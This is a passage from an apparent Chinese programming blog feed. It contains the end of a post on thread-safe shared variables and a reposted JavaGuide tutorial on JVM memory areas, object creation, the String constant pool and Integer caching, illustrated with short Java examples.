class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 类变量</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">int</span> a;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 成员变量</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> b;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 局部变量</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> c</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">(<span class="keyword">int</span> c)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> d;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面定义的三个变量中，变量a就是类变量，变量b就是成员变量，而变量c和d是局部变量。</p><p>所以，变量a和b是共享变量，变量c和d是非共享变量。所以如果遇到多线程场景，对于变量a和b的操作是需要考虑线程安全的，而对于线程c和d的操作是不需要考虑线程安全的。</p><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>在了解了一些基础知识以后，我们再来回过头看看线程安全的定义：</p><blockquote><p>线程安全是编程中的术语，指某个函数、函数库在<strong>并发</strong>环境中被调用时，能够正确地处理<strong>多个线程</strong>之间的<strong>共享变量</strong>，使程序功能正确完成。</p></blockquote><p>现在我们知道了什么是并发环境，什么是多个线程以及什么是共享变量。那么只要我们在编写多线程的代码的时候注意一下，保证程序功能可以正确的执行就行了。</p><p>那么问题来了，定义中说线程安全能够<strong>正确地处理</strong>多个线程之间的共享变量，使程序功能<strong>正确完成</strong>。</p><p>多线程场景中存在哪些问题会导致无法正确的处理共享变量？ 多线程场景中存在哪些问题会导致程序无法正确完成？ 如何解决多线程场景中影响『正确』的这些问题？ 解决这些问题的各个手段的实现原理又是什么？</p><p>以上问题会在后续文章中介绍。</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>线程</category>
      </categories>
      <tags>
        <tag>线程</tag>
      </tags>
  </entry>
  <entry>
    <title>Java内存区域详解</title>
    <url>/2021/04/12/2195/</url>
    <content><![CDATA[<!-- build time:Fri Apr 29 2022 10:26:31 GMT+0800 (GMT+08:00) --><p><code>本文转自JavaGuide</code></p><p>对于 Java 程序员来说，在虚拟机自动内存管理机制下，不再需要像 C/C++程序开发程序员这样为每一个 new 操作去写对应的 delete/free 操作，不容易出现内存泄漏和内存溢出问题。正是因为 Java 程序员把内存控制权利交给 Java 虚拟机，一旦出现内存泄漏和溢出方面的问题，如果不了解虚拟机是怎样使用内存的，那么排查错误将会是一个非常艰巨的任务。</p><a id="more"></a><h1 id="运行时数据区域"><a href="#运行时数据区域" class="headerlink" title="运行时数据区域"></a>运行时数据区域</h1><p>Java 虚拟机在执行 Java 程序的过程中会把它管理的内存划分成若干个不同的数据区域。JDK. 1.8 和之前的版本略有不同，下面会介绍到。</p><p><strong>JDK 1.8 之前：</strong></p><p><img src="/2021/04/12/2195/1.webp" alt="1594951904"></p><p><strong>JDK 1.8 ：</strong></p><p><img src="/2021/04/12/2195/2.jpg" alt="1594951904"></p><p><strong>线程私有的：</strong></p><ul><li>程序计数器</li><li>虚拟机栈</li><li>本地方法栈</li></ul><p><strong>线程共享的：</strong></p><ul><li>堆</li><li>方法区</li><li>直接内存 (非运行时数据区的一部分)</li></ul><h2 id="程序计数器"><a href="#程序计数器" class="headerlink" title="程序计数器"></a>程序计数器</h2><p>程序计数器是一块较小的内存空间，可以看作是当前线程所执行的字节码的行号指示器。<strong>字节码解释器工作时通过改变这个计数器的值来选取下一条需要执行的字节码指令，分支、循环、跳转、异常处理、线程恢复等功能都需要依赖这个计数器来完成。</strong></p><p>另外，<strong>为了线程切换后能恢复到正确的执行位置，每条线程都需要有一个独立的程序计数器，各线程之间计数器互不影响，独立存储，我们称这类内存区域为“线程私有”的内存。</strong></p><p><strong>从上面的介绍中我们知道程序计数器主要有两个作用：</strong></p><ol><li>字节码解释器通过改变程序计数器来依次读取指令，从而实现代码的流程控制，如：顺序执行、选择、循环、异常处理。</li><li>在多线程的情况下，程序计数器用于记录当前线程执行的位置，从而当线程被切换回来的时候能够知道该线程上次运行到哪儿了。</li></ol><p><strong>注意：程序计数器是唯一一个不会出现 OutOfMemoryError 的内存区域，它的生命周期随着线程的创建而创建，随着线程的结束而死亡。</strong></p><h2 id="Java-虚拟机栈"><a href="#Java-虚拟机栈" class="headerlink" title="Java 虚拟机栈"></a>Java 虚拟机栈</h2><p><strong>与程序计数器一样，Java 虚拟机栈也是线程私有的，它的生命周期和线程相同，描述的是 Java 方法执行的内存模型，每次方法调用的数据都是通过栈传递的。</strong></p><p><strong>Java 内存可以粗糙的区分为堆内存（Heap）和栈内存 (Stack),其中栈就是现在说的虚拟机栈，或者说是虚拟机栈中局部变量表部分。</strong> （实际上，Java 虚拟机栈是由一个个栈帧组成，而每个栈帧中都拥有：局部变量表、操作数栈、动态链接、方法出口信息。）</p><p><strong>局部变量表主要存放了编译器可知的各种数据类型</strong>（boolean、byte、char、short、int、float、long、double）、<strong>对象引用</strong>（reference 类型，它不同于对象本身，可能是一个指向对象起始地址的引用指针，也可能是指向一个代表对象的句柄或其他与此对象相关的位置）。</p><p><strong>Java 虚拟机栈会出现两种错误：StackOverFlowError 和 OutOfMemoryError。</strong></p><ul><li><strong>StackOverFlowError：</strong> 若 Java 虚拟机栈的内存大小不允许动态扩展，那么当线程请求栈的深度超过当前 Java 虚拟机栈的最大深度的时候，就抛出 StackOverFlowError 错误。</li><li><strong>OutOfMemoryError：</strong> 若 Java 虚拟机栈的内存大小允许动态扩展，且当线程请求栈时内存用完了，无法再动态扩展了，此时抛出 OutOfMemoryError 错误。</li></ul><p>Java 虚拟机栈也是线程私有的，每个线程都有各自的 Java 虚拟机栈，而且随着线程的创建而创建，随着线程的死亡而死亡。</p><p><strong>扩展：那么方法/函数如何调用？</strong></p><p>Java 栈可用类比数据结构中栈，Java 栈中保存的主要内容是栈帧，每一次函数调用都会有一个对应的栈帧被压入 Java 栈，每一个函数调用结束后，都会有一个栈帧被弹出。</p><p>Java 方法有两种返回方式：</p><ol><li>return 语句。</li><li>抛出异常。</li></ol><p>不管哪种返回方式都会导致栈帧被弹出。</p><h2 id="本地方法栈"><a href="#本地方法栈" class="headerlink" title="本地方法栈"></a>本地方法栈</h2><p>和虚拟机栈所发挥的作用非常相似，区别是：<strong>虚拟机栈为虚拟机执行 Java 方法 （也就是字节码）服务，而本地方法栈则为虚拟机使用到的 Native 方法服务。</strong> 在 HotSpot 虚拟机中和 Java 虚拟机栈合二为一。</p><p>本地方法被执行的时候，在本地方法栈也会创建一个栈帧，用于存放该本地方法的局部变量表、操作数栈、动态链接、出口信息。</p><p>方法执行完毕后相应的栈帧也会出栈并释放内存空间，也会出现 StackOverFlowError 和 OutOfMemoryError 两种错误。</p><h2 id="堆"><a href="#堆" class="headerlink" title="堆"></a>堆</h2><p>Java 虚拟机所管理的内存中最大的一块，Java 堆是所有线程共享的一块内存区域，在虚拟机启动时创建。<strong>此内存区域的唯一目的就是存放对象实例，几乎所有的对象实例以及数组都在这里分配内存。</strong></p><p>Java 堆是垃圾收集器管理的主要区域，因此也被称作<strong>GC 堆（Garbage Collected Heap）</strong>.从垃圾回收的角度，由于现在收集器基本都采用分代垃圾收集算法，所以 Java 堆还可以细分为：新生代和老年代：再细致一点有：Eden 空间、From Survivor、To Survivor 空间等。<strong>进一步划分的目的是更好地回收内存，或者更快地分配内存。</strong></p><p>在 JDK 7 版本及JDK 7 版本之前，堆内存被通常被分为下面三部分：</p><ol><li>新生代内存(Young Ceneration)</li><li>老生代(Old Generation)</li><li>永生代(Permanent Generation)</li></ol><p><img src="/2021/04/12/2195/3.webp" alt="1594951904"></p><p>JDK 8 版本之后方法区（HotSpot 的永久代）被彻底移除了（JDK1.7 就已经开始了），取而代之是元空间，元空间使用的是直接内存。</p><p><img src="/2021/04/12/2195/4.webp" alt="1594951904"></p><p><strong>上图所示的 Eden 区、两个 Survivor 区都属于新生代（为了区分，这两个 Survivor 区域按照顺序被命名为 from 和 to），中间一层属于老年代。</strong></p><p>大部分情况，对象都会首先在 Eden 区域分配，在一次新生代垃圾回收后，如果对象还存活，则会进入 s0 或者 s1，并且对象的年龄还会加 1(Eden 区-&gt;Survivor 区后对象的初始年龄变为 1)，当它的年龄增加到一定程度（默认为 15 岁），就会被晋升到老年代中。对象晋升到老年代的年龄阈值，可以通过参数 <code>-XX:MaxTenuringThreshold</code> 来设置。</p><blockquote><p>修正（issue552）：“Hotspot遍历所有对象时，按照年龄从小到大对其所占用的大小进行累积，当累积的某个年龄大小超过了survivor区的一半时，取这个年龄和MaxTenuringThreshold中更小的一个值，作为新的晋升年龄阈值”。</p><p><strong>动态年龄计算的代码如下</strong></p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">uint <span class="title">ageTable::compute_tenuring_threshold</span><span class="params">(<span class="keyword">size_t</span> survivor_capacity)</span> </span>&#123;</span><br><span class="line"><span class="comment">//survivor_capacity是survivor空间的大小</span></span><br><span class="line">  <span class="keyword">size_t</span> desired_survivor_size = (<span class="keyword">size_t</span>)((((<span class="keyword">double</span>) survivor_capacity)*TargetSurvivorRatio)/<span class="number">100</span>);</span><br><span class="line">  <span class="keyword">size_t</span> total = <span class="number">0</span>;</span><br><span class="line">  uint age = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">while</span> (age &lt; table_size) &#123;</span><br><span class="line">    total += sizes[age];<span class="comment">//sizes数组是每个年龄段对象大小</span></span><br><span class="line">    <span class="keyword">if</span> (total &gt; desired_survivor_size) <span class="keyword">break</span>;</span><br><span class="line">    age++;</span><br><span class="line">  &#125;</span><br><span class="line">  uint result = age &lt; MaxTenuringThreshold ? age : MaxTenuringThreshold;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></blockquote><p>堆这里最容易出现的就是 OutOfMemoryError 错误，并且出现这种错误之后的表现形式还会有几种，比如：</p><ol><li><strong>OutOfMemoryError: GC Overhead Limit Exceeded</strong> ：当JVM花太多时间执行垃圾回收并且只能回收很少的堆空间时，就会发生此错误。</li><li><strong>java.lang.OutOfMemoryError: Java heap space</strong> :假如在创建新的对象时, 堆内存中的空间不足以存放新创建的对象, 就会引发<code>java.lang.OutOfMemoryError: Java heap space</code> 错误。(和本机物理内存无关，和你配置的对内存大小有关！)</li><li>……</li></ol><h2 id="方法区"><a href="#方法区" class="headerlink" title="方法区"></a>方法区</h2><p>方法区与 Java 堆一样，是各个线程共享的内存区域，它用于存储已被虚拟机加载的类信息、常量、静态变量、即时编译器编译后的代码等数据。虽然 <strong>Java 虚拟机规范把方法区描述为堆的一个逻辑部分</strong>，但是它却有一个别名叫做 <strong>Non-Heap（非堆）</strong>，目的应该是与 Java 堆区分开来。</p><p>方法区也被称为永久代。很多人都会分不清方法区和永久代的关系，为此我也查阅了文献。</p><h3 id="方法区和永久代的关系"><a href="#方法区和永久代的关系" class="headerlink" title="方法区和永久代的关系"></a>方法区和永久代的关系</h3><blockquote><p>《Java 虚拟机规范》只是规定了有方法区这么个概念和它的作用，并没有规定如何去实现它。那么，在不同的 JVM 上方法区的实现肯定是不同的了。 <strong>方法区和永久代的关系很像 Java 中接口和类的关系，类实现了接口，而永久代就是 HotSpot 虚拟机对虚拟机规范中方法区的一种实现方式。</strong> 也就是说，永久代是 HotSpot 的概念，方法区是 Java 虚拟机规范中的定义，是一种规范，而永久代是一种实现，一个是标准一个是实现，其他的虚拟机实现并没有永久代这一说法。</p></blockquote><h3 id="常用参数"><a href="#常用参数" class="headerlink" title="常用参数"></a>常用参数</h3><p>JDK 1.8 之前永久代还没被彻底移除的时候通常通过下面这些参数来调节方法区大小</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-XX:PermSize&#x3D;N &#x2F;&#x2F;方法区 (永久代) 初始大小</span><br><span class="line">-XX:MaxPermSize&#x3D;N &#x2F;&#x2F;方法区 (永久代) 最大大小,超过这个值将会抛出 OutOfMemoryError 异常:java.lang.OutOfMemoryError: PermGen</span><br></pre></td></tr></table></figure><p>相对而言，垃圾收集行为在这个区域是比较少出现的，但并非数据进入方法区后就“永久存在”了。</p><p>JDK 1.8 的时候，方法区（HotSpot 的永久代）被彻底移除了（JDK1.7 就已经开始了），取而代之是元空间，元空间使用的是直接内存。</p><p>下面是一些常用参数：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-XX:MetaspaceSize&#x3D;N &#x2F;&#x2F;设置 Metaspace 的初始（和最小大小）</span><br><span class="line">-XX:MaxMetaspaceSize&#x3D;N &#x2F;&#x2F;设置 Metaspace 的最大大小</span><br></pre></td></tr></table></figure><p>与永久代很大的不同就是，如果不指定大小的话，随着更多类的创建，虚拟机会耗尽所有可用的系统内存。</p><h3 id="为什么要将永久代-PermGen-替换为元空间-MetaSpace-呢"><a href="#为什么要将永久代-PermGen-替换为元空间-MetaSpace-呢" class="headerlink" title="为什么要将永久代 (PermGen) 替换为元空间 (MetaSpace) 呢?"></a>为什么要将永久代 (PermGen) 替换为元空间 (MetaSpace) 呢?</h3><p>整个永久代有一个 JVM 本身设置固定大小上限，无法进行调整，而元空间使用的是直接内存，受本机可用内存的限制，并且永远不会得到 <code>java.lang.OutOfMemoryError</code>。你可以使用 <code>-XX：MaxMetaspaceSize</code> 标志设置最大元空间大小，默认值为 unlimited，这意味着它只受系统内存的限制。<code>-XX：MetaspaceSize</code> 调整标志定义元空间的初始大小如果未指定此标志，则 Metaspace 将根据运行时的应用程序需求动态地重新调整大小。</p><p>当然这只是其中一个原因，还有很多底层的原因，这里就不提了。</p><h2 id="运行时常量池"><a href="#运行时常量池" class="headerlink" title="运行时常量池"></a>运行时常量池</h2><p>运行时常量池是方法区的一部分。Class 文件中除了有类的版本、字段、方法、接口等描述信息外，还有常量池信息（用于存放编译期生成的各种字面量和符号引用）</p><p>既然运行时常量池是方法区的一部分，自然受到方法区内存的限制，当常量池无法再申请到内存时会抛出 OutOfMemoryError 错误。</p><p><strong>JDK1.7 及之后版本的 JVM 已经将运行时常量池从方法区中移了出来，在 Java 堆（Heap）中开辟了一块区域存放运行时常量池。</strong></p><p><img src="/2021/04/12/2195/5.webp" alt="1594951904"></p><h2 id="直接内存"><a href="#直接内存" class="headerlink" title="直接内存"></a>直接内存</h2><p><strong>直接内存并不是虚拟机运行时数据区的一部分，也不是虚拟机规范中定义的内存区域，但是这部分内存也被频繁地使用。而且也可能导致 OutOfMemoryError 错误出现。</strong></p><p>JDK1.4 中新加入的 <strong>NIO(New Input/Output) 类</strong>，引入了一种基于<strong>通道（Channel）</strong> 与<strong>缓存区（Buffer）</strong> 的 I/O 方式，它可以直接使用 Native 函数库直接分配堆外内存，然后通过一个存储在 Java 堆中的 DirectByteBuffer 对象作为这块内存的引用进行操作。这样就能在一些场景中显著提高性能，因为<strong>避免了在 Java 堆和 Native 堆之间来回复制数据</strong>。</p><p>本机直接内存的分配不会受到 Java 堆的限制，但是，既然是内存就会受到本机总内存大小以及处理器寻址空间的限制。</p><h1 id="HotSpot-虚拟机对象探秘"><a href="#HotSpot-虚拟机对象探秘" class="headerlink" title="HotSpot 虚拟机对象探秘"></a>HotSpot 虚拟机对象探秘</h1><p>通过上面的介绍我们大概知道了虚拟机的内存情况，下面我们来详细的了解一下 HotSpot 虚拟机在 Java 堆中对象分配、布局和访问的全过程。</p><h2 id="对象的创建"><a href="#对象的创建" class="headerlink" title="对象的创建"></a>对象的创建</h2><p>下图便是 Java 对象的创建过程，我建议最好是能默写出来，并且要掌握每一步在做什么。</p><p><img src="/2021/04/12/2195/6.webp" alt="1594951904"></p><h4 id="Step1-类加载检查"><a href="#Step1-类加载检查" class="headerlink" title="Step1:类加载检查"></a>Step1:类加载检查</h4><p>虚拟机遇到一条 new 指令时，首先将去检查这个指令的参数是否能在常量池中定位到这个类的符号引用，并且检查这个符号引用代表的类是否已被加载过、解析和初始化过。如果没有，那必须先执行相应的类加载过程。</p><h4 id="Step2-分配内存"><a href="#Step2-分配内存" class="headerlink" title="Step2:分配内存"></a>Step2:分配内存</h4><p>在<strong>类加载检查</strong>通过后，接下来虚拟机将为新生对象<strong>分配内存</strong>。对象所需的内存大小在类加载完成后便可确定，为对象分配空间的任务等同于把一块确定大小的内存从 Java 堆中划分出来。<strong>分配方式</strong>有 <strong>“指针碰撞”</strong> 和 <strong>“空闲列表”</strong> 两种，<strong>选择那种分配方式由 Java 堆是否规整决定，而 Java 堆是否规整又由所采用的垃圾收集器是否带有压缩整理功能决定</strong>。</p><p><strong>内存分配的两种方式：（补充内容，需要掌握）</strong></p><p>选择以上两种方式中的哪一种，取决于 Java 堆内存是否规整。而 Java 堆内存是否规整，取决于 GC 收集器的算法是”标记-清除”，还是”标记-整理”（也称作”标记-压缩”），值得注意的是，复制算法内存也是规整的</p><p><img src="/2021/04/12/2195/7.png" alt="1594951904"></p><p><strong>内存分配并发问题（补充内容，需要掌握）</strong></p><p>在创建对象的时候有一个很重要的问题，就是线程安全，因为在实际开发过程中，创建对象是很频繁的事情，作为虚拟机来说，必须要保证线程是安全的，通常来讲，虚拟机采用两种方式来保证线程安全：</p><ul><li><strong>CAS+失败重试：</strong> CAS 是乐观锁的一种实现方式。所谓乐观锁就是，每次不加锁而是假设没有冲突而去完成某项操作，如果因为冲突失败就重试，直到成功为止。<strong>虚拟机采用 CAS 配上失败重试的方式保证更新操作的原子性。</strong></li><li><strong>TLAB：</strong> 为每一个线程预先在 Eden 区分配一块儿内存，JVM 在给线程中的对象分配内存时，首先在 TLAB 分配，当对象大于 TLAB 中的剩余内存或 TLAB 的内存已用尽时，再采用上述的 CAS 进行内存分配</li></ul><h4 id="Step3-初始化零值"><a href="#Step3-初始化零值" class="headerlink" title="Step3:初始化零值"></a>Step3:初始化零值</h4><p>内存分配完成后，虚拟机需要将分配到的内存空间都初始化为零值（不包括对象头），这一步操作保证了对象的实例字段在 Java 代码中可以不赋初始值就直接使用，程序能访问到这些字段的数据类型所对应的零值。</p><h4 id="Step4-设置对象头"><a href="#Step4-设置对象头" class="headerlink" title="Step4:设置对象头"></a>Step4:设置对象头</h4><p>初始化零值完成之后，<strong>虚拟机要对对象进行必要的设置</strong>，例如这个对象是那个类的实例、如何才能找到类的元数据信息、对象的哈希码、对象的 GC 分代年龄等信息。<strong>这些信息存放在对象头中。</strong> 另外，根据虚拟机当前运行状态的不同，如是否启用偏向锁等，对象头会有不同的设置方式。</p><h4 id="Step5-执行-init-方法"><a href="#Step5-执行-init-方法" class="headerlink" title="Step5:执行 init 方法"></a>Step5:执行 init 方法</h4><p>在上面工作都完成之后，从虚拟机的视角来看，一个新的对象已经产生了，但从 Java 程序的视角来看，对象创建才刚开始，<code>&lt;init&gt;</code> 方法还没有执行，所有的字段都还为零。所以一般来说，执行 new 指令之后会接着执行 <code>&lt;init&gt;</code> 方法，把对象按照程序员的意愿进行初始化，这样一个真正可用的对象才算完全产生出来。</p><h3 id="3-2-对象的内存布局"><a href="#3-2-对象的内存布局" class="headerlink" title="3.2 对象的内存布局"></a>3.2 对象的内存布局</h3><p>在 Hotspot 虚拟机中，对象在内存中的布局可以分为 3 块区域：<strong>对象头</strong>、<strong>实例数据</strong>和<strong>对齐填充</strong>。</p><p><strong>Hotspot 虚拟机的对象头包括两部分信息</strong>，<strong>第一部分用于存储对象自身的自身运行时数据</strong>（哈希码、GC 分代年龄、锁状态标志等等），<strong>另一部分是类型指针</strong>，即对象指向它的类元数据的指针，虚拟机通过这个指针来确定这个对象是那个类的实例。</p><p><strong>实例数据部分是对象真正存储的有效信息</strong>，也是在程序中所定义的各种类型的字段内容。</p><p><strong>对齐填充部分不是必然存在的，也没有什么特别的含义，仅仅起占位作用。</strong> 因为 Hotspot 虚拟机的自动内存管理系统要求对象起始地址必须是 8 字节的整数倍，换句话说就是对象的大小必须是 8 字节的整数倍。而对象头部分正好是 8 字节的倍数（1 倍或 2 倍），因此，当对象实例数据部分没有对齐时，就需要通过对齐填充来补全。</p><h3 id="3-3-对象的访问定位"><a href="#3-3-对象的访问定位" class="headerlink" title="3.3 对象的访问定位"></a>3.3 对象的访问定位</h3><p>建立对象就是为了使用对象，我们的 Java 程序通过栈上的 reference 数据来操作堆上的具体对象。对象的访问方式由虚拟机实现而定，目前主流的访问方式有<strong>①使用句柄</strong>和<strong>②直接指针</strong>两种：</p><ol><li><strong>句柄：</strong> 如果使用句柄的话，那么 Java 堆中将会划分出一块内存来作为句柄池，reference 中存储的就是对象的句柄地址，而句柄中包含了对象实例数据与类型数据各自的具体地址信息；</li></ol><p><img src="/2021/04/12/2195/8.webp" alt="1594951904"></p><ol><li><strong>直接指针：</strong> 如果使用直接指针访问，那么 Java 堆对象的布局中就必须考虑如何放置访问类型数据的相关信息，而 reference 中存储的直接就是对象的地址。</li></ol><p><img src="/2021/04/12/2195/9.webp" alt="1594951904"></p><p><strong>这两种对象访问方式各有优势。使用句柄来访问的最大好处是 reference 中存储的是稳定的句柄地址，在对象被移动时只会改变句柄中的实例数据指针，而 reference 本身不需要修改。使用直接指针访问方式最大的好处就是速度快，它节省了一次指针定位的时间开销。</strong></p><h1 id="重点补充内容"><a href="#重点补充内容" class="headerlink" title="重点补充内容"></a>重点补充内容</h1><h2 id="String-类和常量池"><a href="#String-类和常量池" class="headerlink" title="String 类和常量池"></a>String 类和常量池</h2><p><strong>String 对象的两种创建方式：</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String str1 = <span class="string">"abcd"</span>;<span class="comment">//先检查字符串常量池中有没有"abcd"，如果字符串常量池中没有，则创建一个，然后 str1 指向字符串常量池中的对象，如果有，则直接将 str1 指向"abcd""；</span></span><br><span class="line">String str2 = <span class="keyword">new</span> String(<span class="string">"abcd"</span>);<span class="comment">//堆中创建一个新的对象</span></span><br><span class="line">String str3 = <span class="keyword">new</span> String(<span class="string">"abcd"</span>);<span class="comment">//堆中创建一个新的对象</span></span><br><span class="line">System.out.println(str1==str2);<span class="comment">//false</span></span><br><span class="line">System.out.println(str2==str3);<span class="comment">//false</span></span><br></pre></td></tr></table></figure><p>这两种不同的创建方法是有差别的。</p><ul><li>第一种方式是在常量池中拿对象；</li><li>第二种方式是直接在堆内存空间创建一个新的对象。</li></ul><p>记住一点：<strong>只要使用 new 方法，便需要创建新的对象。</strong></p><p><img src="/2021/04/12/2195/10.png" alt="1594951904"></p><p><strong>String 类型的常量池比较特殊。它的主要使用方法有两种：</strong></p><ul><li>直接使用双引号声明出来的 String 对象会直接存储在常量池中。</li><li>如果不是用双引号声明的 String 对象，可以使用 String 提供的 intern 方法。String.intern() 是一个 Native 方法，它的作用是：如果运行时常量池中已经包含一个等于此 String 对象内容的字符串，则返回常量池中该字符串的引用；如果没有，JDK1.7之前（不包含1.7）的处理方式是在常量池中创建与此 String 内容相同的字符串，并返回常量池中创建的字符串的引用，JDK1.7以及之后的处理方式是在常量池中记录此字符串的引用，并返回该引用。</li></ul><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String s1 = <span class="keyword">new</span> String(<span class="string">"计算机"</span>);</span><br><span class="line">String s2 = s1.intern();</span><br><span class="line">String s3 = <span class="string">"计算机"</span>;</span><br><span class="line">System.out.println(s2);<span class="comment">//计算机</span></span><br><span class="line">System.out.println(s1 == s2);<span class="comment">//false，因为一个是堆内存中的 String 对象一个是常量池中的 String 对象，</span></span><br><span class="line">System.out.println(s3 == s2);<span class="comment">//true，因为两个都是常量池中的 String 对象</span></span><br></pre></td></tr></table></figure><p><strong>字符串拼接:</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String str1 = <span class="string">"str"</span>;</span><br><span class="line">String str2 = <span class="string">"ing"</span>;</span><br><span class="line"> </span><br><span class="line">String str3 = <span class="string">"str"</span> + <span class="string">"ing"</span>;<span class="comment">//常量池中的对象</span></span><br><span class="line">String str4 = str1 + str2; <span class="comment">//在堆上创建的新的对象</span></span><br><span class="line">String str5 = <span class="string">"string"</span>;<span class="comment">//常量池中的对象</span></span><br><span class="line">System.out.println(str3 == str4);<span class="comment">//false</span></span><br><span class="line">System.out.println(str3 == str5);<span class="comment">//true</span></span><br><span class="line">System.out.println(str4 == str5);<span class="comment">//false</span></span><br></pre></td></tr></table></figure><p><img src="/2021/04/12/2195/11.png" alt="1594951904"></p><p>尽量避免多个字符串拼接，因为这样会重新创建对象。如果需要改变字符串的话，可以使用 StringBuilder 或者 StringBuffer。</p><h2 id="String-s1-new-String-“abc”-这句话创建了几个字符串对象？"><a href="#String-s1-new-String-“abc”-这句话创建了几个字符串对象？" class="headerlink" title="String s1 = new String(“abc”);这句话创建了几个字符串对象？"></a>String s1 = new String(“abc”);这句话创建了几个字符串对象？</h2><p><strong>将创建 1 或 2 个字符串。如果池中已存在字符串常量“abc”，则只会在堆空间创建一个字符串常量“abc”。如果池中没有字符串常量“abc”，那么它将首先在池中创建，然后在堆空间中创建，因此将创建总共 2 个字符串对象。</strong></p><p><strong>验证：</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">String s1 &#x3D; new String(&quot;abc&quot;);&#x2F;&#x2F; 堆内存的地址值</span><br><span class="line">String s2 &#x3D; &quot;abc&quot;;</span><br><span class="line">System.out.println(s1 &#x3D;&#x3D; s2);&#x2F;&#x2F; 输出 false,因为一个是堆内存，一个是常量池的内存，故两者是不同的。</span><br><span class="line">System.out.println(s1.equals(s2));&#x2F;&#x2F; 输出 true</span><br></pre></td></tr></table></figure><p><strong>结果：</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">false</span><br><span class="line">true</span><br></pre></td></tr></table></figure><h2 id="8-种基本类型的包装类和常量池"><a href="#8-种基本类型的包装类和常量池" class="headerlink" title="8 种基本类型的包装类和常量池"></a>8 种基本类型的包装类和常量池</h2><ul><li><strong>Java 基本类型的包装类的大部分都实现了常量池技术，即 Byte,Short,Integer,Long,Character,Boolean；这 5 种包装类默认创建了数值[-128，127] 的相应类型的缓存数据，但是超出此范围仍然会去创建新的对象。</strong> 为啥把缓存设置为[-128，127]区间？（参见issue/461）性能和资源之间的权衡。</li><li><strong>两种浮点数类型的包装类 Float,Double 并没有实现常量池技术。</strong></li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Integer i1 &#x3D; 33;</span><br><span class="line">Integer i2 &#x3D; 33;</span><br><span class="line">System.out.println(i1 &#x3D;&#x3D; i2);&#x2F;&#x2F; 输出 true</span><br><span class="line">Integer i11 &#x3D; 333;</span><br><span class="line">Integer i22 &#x3D; 333;</span><br><span class="line">System.out.println(i11 &#x3D;&#x3D; i22);&#x2F;&#x2F; 输出 false</span><br><span class="line">Double i3 &#x3D; 1.2;</span><br><span class="line">Double i4 &#x3D; 1.2;</span><br><span class="line">System.out.println(i3 &#x3D;&#x3D; i4);&#x2F;&#x2F; 输出 false</span><br></pre></td></tr></table></figure><p><strong>Integer 缓存源代码：</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line">*此方法将始终缓存-128 到 127（包括端点）范围内的值，并可以缓存此范围之外的其他值。</span><br><span class="line">*&#x2F;</span><br><span class="line">    public static Integer valueOf(int i) &#123;</span><br><span class="line">        if (i &gt;&#x3D; IntegerCache.low &amp;&amp; i &lt;&#x3D; IntegerCache.high)</span><br><span class="line">            return IntegerCache.cache[i + (-IntegerCache.low)];</span><br><span class="line">        returnnew Integer(i);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><strong>应用场景：</strong></p><ol><li>Integer i1=40；Java 在编译的时候会直接将代码封装成 Integer i1=Integer.valueOf(40);，从而使用常量池中的对象。</li><li>Integer i1 = new Integer(40);这种情况下会创建新的对象。</li></ol><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Integer i1 &#x3D; 40;</span><br><span class="line">Integer i2 &#x3D; new Integer(40);</span><br><span class="line">System.out.println(i1&#x3D;&#x3D;i2);&#x2F;&#x2F;输出 false</span><br></pre></td></tr></table></figure><p><strong>Integer 比较更丰富的一个例子:</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Integer i1 &#x3D; 40;</span><br><span class="line">Integer i2 &#x3D; 40;</span><br><span class="line">Integer i3 &#x3D; 0;</span><br><span class="line">Integer i4 &#x3D; new Integer(40);</span><br><span class="line">Integer i5 &#x3D; new Integer(40);</span><br><span class="line">Integer i6 &#x3D; new Integer(0);</span><br><span class="line"></span><br><span class="line">System.out.println(&quot;i1&#x3D;i2   &quot; + (i1 &#x3D;&#x3D; i2));</span><br><span class="line">System.out.println(&quot;i1&#x3D;i2+i3   &quot; + (i1 &#x3D;&#x3D; i2 + i3));</span><br><span class="line">System.out.println(&quot;i1&#x3D;i4   &quot; + (i1 &#x3D;&#x3D; i4));</span><br><span class="line">System.out.println(&quot;i4&#x3D;i5   &quot; + (i4 &#x3D;&#x3D; i5));</span><br><span class="line">System.out.println(&quot;i4&#x3D;i5+i6   &quot; + (i4 &#x3D;&#x3D; i5 + i6));</span><br><span class="line">System.out.println(&quot;40&#x3D;i5+i6   &quot; + (40 &#x3D;&#x3D; i5 + i6));</span><br></pre></td></tr></table></figure><p>结果：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">i1&#x3D;i2   true</span><br><span class="line">i1&#x3D;i2+i3   true</span><br><span class="line">i1&#x3D;i4   false</span><br><span class="line">i4&#x3D;i5   false</span><br><span class="line">i4&#x3D;i5+i6   true</span><br><span 